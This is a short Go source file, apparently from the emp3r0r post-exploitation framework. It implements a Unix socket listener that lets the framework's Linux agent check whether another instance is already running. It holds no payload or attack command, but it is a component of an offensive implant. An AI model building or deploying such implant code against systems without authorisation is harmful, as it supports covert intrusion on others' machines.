//go:build linux
// +build linux

package main

import (
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"net"
	"os"
	"path/filepath"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// listen on a unix socket, used to check if agent is responsive
func socketListen() {
	logging.Printf("Starting socket listener on %s", common.RuntimeConfig.SocketName)
	// if socket file exists
	if util.IsExist(common.RuntimeConfig.SocketName) {
		logging.Printf("%s exists, testing connection...", common.RuntimeConfig.SocketName)
		if isAgentAliveSocket() {
			logging.Fatalf("%s exists, and agent is alive, aborting", common.RuntimeConfig.SocketName)
		}
		err := os.Remove(common.RuntimeConfig.SocketName)
		if err != nil {
			logging.Fatalf("Failed to delete socket: %v", err)
		}
	}
	cwd, err := os.Getwd()
	if err != nil {
		logging.Fatalf("Failed to get current working directory: %v", err)
	}
	os.Chdir(filepath.Dir(common.RuntimeConfig.SocketName))
	defer os.Chdir(cwd)
	logging.Printf("Cd to %s", common.RuntimeConfig.AgentRoot)

	// use basename to make sure the socket path is not too long (107), otherwise it will fail
	socket_name := util.FileBaseName(common.RuntimeConfig.SocketName)
	l, err := net.Listen("unix", socket_name)
	if err != nil {
		logging.Fatalf("failed to bind unix socket %s: %v", socket_name, err)
	}
	for {
		fd, err := l.Accept()
		if err != nil {
			logging.Fatal("accept error:", err)
		}
		go socket_server(fd)
	}
}

func isAgentAliveSocket() bool {
	logging.Printf("Checking if agent is alive via socket %s", common.RuntimeConfig.SocketName)
	conn, err := net.Dial("unix", common.RuntimeConfig.SocketName)
	if err != nil {
		logging.Printf("Agent seems dead: %v, removing socket to bind", err)
		err := os.Remove(common.RuntimeConfig.SocketName)
		if err != nil {
			logging.Printf("Failed to remove socket: %v", err)
		}
		return false
	}
	defer conn.Close()
	return agentutils.IsAgentAlive(conn)
}
